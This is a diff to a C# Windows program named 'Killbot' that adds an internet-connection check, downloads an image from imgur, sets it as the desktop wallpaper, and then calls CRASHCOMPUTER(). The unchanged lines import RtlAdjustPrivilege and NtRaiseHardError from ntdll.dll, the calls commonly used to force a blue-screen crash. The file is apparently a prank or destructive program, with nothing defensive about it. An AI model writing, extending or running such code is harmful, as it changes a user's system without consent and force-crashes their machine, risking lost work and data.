@@ -14,12 +14,35 @@ namespace Killbot
 {
     class Program
     {
+        public static bool CheckForInternetConnection()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (client.OpenRead("http://google.com/generate_204"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         [DllImport("ntdll.dll")]
         public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
         [DllImport("ntdll.dll")]
         public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
 
+        /// <summary>
+        /// set the parameter of system
+        /// </summary>
+        /// <param name="uAction"></param>
+        /// <param name="uParam"></param>
+        /// <param name="lpvParam"></param>
+        /// <param name="fuWinIni"></param>
+        /// <example></example>
+        /// <returns></returns>
         [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
         public static extern int SystemParametersInfo(UAction uAction, int uParam, StringBuilder lpvParam, int fuWinIni);
         static unsafe void Main(string[] args)
@@ -36,20 +59,25 @@ namespace Killbot
             Thread.Sleep(680);
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("Killbot");
+            string _filePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\killbot.png";
 
-            using (WebClient client = new WebClient())
+            if (CheckForInternetConnection() == true)
             {
-                for (int i = 0; i < 1; i++)
+                using (var client = new WebClient())
                 {
-                    client.DownloadFile(new Uri("https://i.ytimg.com/vi/UQvPvOGYdpw/maxresdefault.jpg"), Environment.GetEnvironmentVariable("userprofile") + @"\Desktop\killbot" + ".png");
+                    client.DownloadFile("https://i.imgur.com/hcniWVZ.jpg", _filePath);
                 }
-                client.DownloadFile(new Uri("https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png"), Environment.GetEnvironmentVariable("userprofile") + @"\Desktop\problem.png");
+                Thread.Sleep(580);
+                GetBackgroud();
+                SetBackgroud(_filePath);
             }
-
-            GetBackgroud();
-            SetBackgroud(Environment.GetEnvironmentVariable("userprofile") + @"\Desktop\killbot.png");
-
-            Thread.Sleep(1580);
+            else
+            {
+                Thread.Sleep(580);
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("not connected to the internet rip");
+            }
+            Thread.Sleep(580);
             CRASHCOMPUTER();
         }
 
@@ -66,7 +94,7 @@ namespace Killbot
             for (int i = 0; i < line.Length; i++)
             {
                 Console.Write(line[i]);
-                System.Threading.Thread.Sleep(speed);
+                System.Threading.Thread.Sleep(speed); // Sleep for 150 milliseconds
             }
         }
 
@@ -81,7 +109,7 @@ namespace Killbot
             SystemParametersInfo(UAction.SPI_GETDESKWALLPAPER, 300, s, 0);
             return s.ToString();
         }
-        
+        /// <param name="fileName">the path of image</param>
         public static int SetBackgroud(string fileName)
         {
             int result = 0;
@@ -92,7 +120,9 @@ namespace Killbot
             }
             return result;
         }
-        
+        /// <param name="optionsName">the name of registry</param>
+        /// <param name="optionsData">set the data of registry</param>
+        /// <param name="msg"></param>
         public static bool SetOptions(string optionsName, string optionsData, ref string msg)
         {
             bool returnBool = true;
